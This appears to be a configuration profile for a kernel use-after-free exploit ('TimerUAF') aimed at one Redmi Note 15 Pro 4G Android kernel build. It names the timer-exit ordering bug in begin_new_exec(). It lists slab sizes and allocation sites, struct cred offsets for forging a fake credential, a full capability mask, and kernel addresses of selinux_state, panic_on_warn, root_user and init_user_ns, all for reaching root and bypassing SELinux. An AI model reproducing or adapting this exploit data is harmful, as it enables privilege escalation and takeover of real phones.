# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Redmi Note 15 Pro 4G (charoite)
# Kernel: 6.12.30-android16-5-g6e872b4863d6-ab13847919-4k (4K pages)
#
# Every constant below is derived from that factory boot.img:
#   init_posix_timers  kmem_cache_create("posix_timers_cache", 0x100, 0,
#                      SLAB_PANIC|SLAB_ACCOUNT) -> timer_alloc 0x100
#   do_timer_create    bl kmem_cache_alloc_noprof at 0xffffffc0801e1a10,
#                      returns to 0xffffffc0801e1a14 (x0 = posix_timers_cache)
#   copy_process       calls dup_task_struct, whose
#                      bl kmem_cache_alloc_node_noprof at 0xffffffc0800d1594
#                      returns to 0xffffffc0800d1598 (x0 = task_struct_cachep)
#                      -> low21 0xd1598
#   arch_task_struct_size = sizeof(task_struct) 0x1440 + 0x200 from
#                      android_arch_task_struct_size=512 in the dtb
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers().
release = "6.12.30-android16-5-g6e872b4863d6-ab13847919-4k"
schema_version = 1
ksu_kmi = "android16-6.12"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# do_timer_create -> kmem_cache_alloc_noprof(posix_timers_cache)
timer_site = 0xffffffc0801e1a14
timer_alloc = 0x100
# The `it` union (k_itimer.it) is at +0x78; its `cpu` member is a
# struct cpu_timer, whose first field `node` is at +0, so the timerqueue
# rb_node sits at +0x78.
timer_node_off = 0x78

# cred_jar: sizeof(struct cred)=0xb8 (BTF), SLAB_HWCACHE_ALIGN -> 0xc0
cred_req = 0xb8
cred_alloc = 0xc0
cred_size = 0xb8
cred_uid_off = 0x8
cred_euid_off = 0x18
cred_cap_off = 0x30
cred_cap_count = 5
cred_security_off = 0x80
cred_user_off = 0x88
cred_userns_off = 0x90
cred_ucounts_off = 0x98
cred_group_off = 0xa0
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc0826784b8
panic_on_warn = 0xffffffc0823eafe0

# task_struct / cred layout (BTF)
task_cred_off = 0x900
copy_process_low21 = 0xd1598
# 0x1440 (BTF sizeof task_struct) + 0x200 (bootconfig vendor extension)
task_alloc_bytes = 0x1640

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc0824117a0
init_user_ns = 0xffffffc082411528
init_ucounts = 0xffffffc082413138
init_groups = 0xffffffc082412c68

# task_security_struct
# Only selinux registers a cred blob here, and it is the first contributor,
# so its offset is 0.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
